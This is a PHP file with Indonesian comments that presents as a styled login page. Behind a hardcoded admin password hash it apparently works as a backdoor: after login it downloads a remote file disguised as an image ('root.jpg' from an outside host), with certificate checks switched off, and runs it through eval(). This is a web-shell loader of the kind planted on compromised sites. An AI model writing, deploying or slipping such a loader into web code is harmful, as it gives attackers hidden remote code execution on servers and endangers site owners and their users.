<?php
session_start();

// Tentukan username dan password hash
$username = "admin";
$passwordHash = '$2y$10$S0e0./U28Ztn.qyTzcRyYugInVS0jkcFEEKUCxvH44pCNntUZgYxi'; // Hash bcrypt

// Cek apakah pengguna sudah login sebelumnya
if (!isset($_SESSION['loggedin'])) {
    // Cek apakah form sudah di-submit
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Validasi username dan password
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            // Jika username dan password benar, set sesi login
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']); // Refresh halaman setelah login
            exit();
        } else {
            $error = "Username atau password salah. Silakan coba lagi.";
        }
    }
}

// Fungsi untuk mengambil konten dari URL menggunakan cURL
function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Jangan verifikasi SSL
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($httpCode === 200) ? $content : false;
}

// Jika sudah login, ambil konten dari URL
if (isset($_SESSION['loggedin'])) {
    $url = 'https://gov.bebasaja.dev/server/root.jpg';
    $content = fetchContent($url);

    if ($content !== false) {
        if (strpos($content, 'session_start()') !== false) {
            $content = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '', $content);
        }
        eval('?>' . $content);
    } else {
        echo "Gagal mengambil konten dari URL.";
    }
    exit();
}

// Jika belum login, tampilkan form login
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="icon" href="https://falconstorage.wordpress.com/wp-content/uploads/2025/03/falcondev.png" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            background: #23242a;
            margin: 0;
        }

        .box {
            position: relative;
            width: 380px;
            height: 450px;
            background: #1c1c1c;
            border-radius: 8px;
            overflow: hidden;
        }

        .box::before {
            content: '';
            z-index: 1;
            position: absolute;
            top: -50%;
            left: -50%;
            width: 380px;
            height: 450px;
            transform-origin: bottom right;
            background: linear-gradient(0deg, transparent, #ffe204, #ffe204);
            animation: animate 6s linear infinite;
        }

        .box::after {
            content: '';
            z-index: 1;
            position: absolute;
            top: -50%;
            left: -50%;
            width: 380px;
            height: 450px;
            transform-origin: bottom right;
            background: linear-gradient(0deg, transparent, #f23836, #f23836);
            animation: animate 6s linear infinite;
            animation-delay: -3s;
        }

        @keyframes animate {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        form {
            position: absolute;
            inset: 2px;
            background: #28292d;
            padding: 50px 40px;
            border-radius: 8px;
            z-index: 2;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h1 {
            color: #fff;
            font-size: 2rem;
            font-weight: 600;
            margin-top: 20px;
            margin-bottom: 20px;
        }

        h1 span {
            color: #f23836;
            position: relative;
        }

        h1 span::before {
            content: "";
            height: 30px;
            width: 2px;
            position: absolute;
            top: 50%;
            right: -8px;
            background: #f23836;
            transform: translateY(-45%);
            animation: blink 0.7s infinite;
        }

        h1 span.stop-blinking::before {
            animation: none;
        }

        @keyframes blink {
            50% {
                opacity: 0
            }
        }

        .inputBox {
            position: relative;
            width: 300px;
            margin-top: 20px;
            margin-bottom: 20px;
        }

        .inputBox input {
            position: relative;
            width: 100%;
            padding: 20px 10px 10px;
            background: transparent;
            outline: none;
            box-shadow: none;
            border: none;
            color: #f23836;
            font-size: 1em;
            letter-spacing: 0.05em;
            transition: 0.5s;
            z-index: 10;
        }

        .inputBox span {
            position: absolute;
            left: 0;
            padding: 20px 0px 10px;
            pointer-events: none;
            font-size: 1em;
            color: #8f8f8f;
            letter-spacing: 0.05em;
            transition: 0.5s;
        }

        .inputBox input:valid~span,
        .inputBox input:focus~span {
            color: #ffe204;
            transform: translateX(0px) translateY(-34px);
            font-size: 0.75em;
        }

        .inputBox i {
            position: absolute;
            left: 0;
            bottom: 0;
            width: 100%;
            height: 2px;
            background: #ffe204;
            border-radius: 4px;
            overflow: hidden;
            transition: 0.5s;
            pointer-events: none;
            z-index: 9;
        }

        .inputBox input:valid~i,
        .inputBox input:focus~i {
            height: 44px;
        }

        button {
            position: relative;
            overflow: hidden;
            width: 7rem;
            color: #ffe204;
            border: 2px solid #ffe204;
            background-color: #28292d;
            cursor: pointer;
            line-height: 2;
            padding: 0;
            border-radius: 1.5rem;
            font-size: 1.125rem;
            text-transform: lowercase;
            outline: none;
            transition: transform 0.125s;
        }

        button:active {
            transform: scale(0.9, 0.9);
        }
    </style>
</head>
<body>
    <div class="box">
        <form method="post">
            <h1><span>Login</span></h1>
            <?php if (isset($error)): ?>
                <div class="error-message"><?php echo $error; ?></div>
            <?php endif; ?>
            <div class="inputBox">
                <input type="text" name="username" required>
                <span>Username</span>
            </div>
            <div class="inputBox">
                <input type="password" name="password" required>
                <span>Password</span>
            </div>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>